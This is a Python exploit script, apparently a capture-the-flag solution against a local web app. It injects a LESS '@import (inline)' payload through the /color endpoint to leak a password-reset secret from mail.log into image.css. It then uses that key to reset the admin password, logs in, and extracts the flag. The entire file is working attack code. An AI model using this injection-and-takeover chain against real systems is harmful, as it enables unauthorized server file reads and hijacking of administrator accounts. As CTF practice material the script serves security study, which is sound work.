import requests
import re

class Exploit:
    def __init__(self, baseURL, newPassword, payload, timeout):
        self.baseURL = baseURL.rstrip("/")
        self.newPassword = newPassword
        self.payload = payload
        self.timeout = timeout

    def trigger_reset_mail(self):
        print(f"[+] Reset Mail Write Secret Key")
        response = requests.post(f"{self.baseURL}/reset_mail", timeout=self.timeout)
        if response.status_code == 200:
            print(f"[+] Trigger Successfully: ", response.text, "\n")
            return True
        else:
            print(f"[-] Trigger Failed: ", response.text)
            return False

    def leak_secret_key(self):
        print(f"[+] Leak Secret Key From Color")
        data = {
            "bgColor[]": self.payload, 
            "fontColor": "#000000"
        }
        response = requests.post(f"{self.baseURL}/color", data=data, timeout=self.timeout)
        if "ColorPicker Done" in response.text:
            print(f"[+] Trigger Shell Successfully")
            return True
        else:
            print(f"[-] Trigger Shell Failed")
            return False

    def fetch_image(self):
        print(f"[+] Get Secret Key")
        url = f"{self.baseURL}/image.css"
        response = requests.get(url=url, timeout=self.timeout)
        if response.status_code == 200:
            print(f"[+] Leak Secret Key Success: ", response.text, "\n")
            return response.text   # trả về text luôn
        else:
            print(f"[-] Leak Secret Key Failed: ", response.text, "\n")
            return None

    def pass_reset_key(self, text_css):
        secret = re.search(r'([0-9a-f]{32})', text_css)
        if secret:
            return secret.group(1)
        else:
            return None

    def pass_reset(self, secret_key):
        url = f"{self.baseURL}/pass_reset"
        data = {
            "password": self.newPassword,
            "key": secret_key
        }
        response = requests.post(url=url, data=data, timeout=self.timeout)
        if "Reset Done" in response.text:
            print(f"[+] Reset Password Success")
            return True
        else:
            print(f"[-] Reset Password Failed")
            return False

    def login_get_flag(self):
        url = f"{self.baseURL}/login"
        data = {
            "username": "admin",
            "password": self.newPassword
        }
        response = requests.post(url=url, data=data, timeout=self.timeout)
        if response.status_code == 200:
            print(f"[+] Login Success: ", response.text, "\n")
        else:
            print(f"[-] Login Failed: ", response.text, "\n")

        flag = re.search(r"(flag\{.*?\})", response.text, re.IGNORECASE)
        if flag:
            print(f"[+] DONE FLAG HERE: \n", flag.group(1))
        else:
            print(f"[-] Not Flag")

    def run(self):
        self.trigger_reset_mail()
        self.leak_secret_key()
        css_text = self.fetch_image()
        if not css_text:
            print(f"[+] Not Found Key")
            return
        key = self.pass_reset_key(css_text)
        if not key:
            print(f"[-] Secret key regex not found")
            return
        print(f"[+] Got Key: ", key)
        self.pass_reset(key)
        self.login_get_flag()


if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:3000"
    newPassword = "123"
    payload = '#5C62D6;@import (inline) "mail.log";'
    timeout = 5.0
    exploit = Exploit(BASE_URL, newPassword, payload, timeout)
    exploit.run()
